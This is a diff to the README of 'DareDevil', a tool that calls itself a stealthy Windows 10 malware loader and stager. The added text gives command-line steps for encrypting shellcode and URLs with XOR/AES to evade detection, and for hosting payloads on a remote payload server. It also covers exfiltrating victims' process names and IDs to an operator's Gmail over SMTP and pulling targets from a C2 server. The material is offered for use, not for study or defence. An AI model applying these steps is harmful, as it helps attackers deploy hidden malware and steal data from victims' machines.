@@ -1,7 +1,31 @@
 # DareDevil
 Stealthy Loader-cum-dropper/stage-1/stager targeting Windows10
 
+How to use Obfuscator/encrypt.cs:
+1. [For shellcode extraction and encryption]: place it in the directory in which .bin file is present.
+2. [For url encryption]: Nothing! Just paste and run.
 
+Example:
+```
+It can encrypt 'shellcode' and 'url' to xor, aes, aes_xor and aes_xor_b64:
+
+// Creating .bin file and Extracting shellcode from .bin file:
+// Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
+// Extract: 
+cmd> encrypt.exe /file:file.bin /out:aes_xor_b64
+
+// paste the output b64 bytes into a .txt file and upload it to payload server.
+// cmd: "mv .\obfuscator\"
+cmd> encrypt.exe /shellcodeurl:<url>.txt /out:aes_xor_b64
+
+cmd> encrypt.exe /mscorliburl:<url>.exe /out:aes_xor_b64
+
+// For Sending/ exfiltrating Victim process name and Ids to Operator Gmail via SMTP server
+cmd> encrypt.exe /remotewriteurl:<url>.exe /out:aes_xor_b64
+
+// For reading pid from pid.txt from payload server/ remote c2 server
+cmd> encrypt.exe /remotereadurl:<url>.txt /out:aes_xor_b64
+```
 
 ### [DareDevil] Resources and Credits:
 
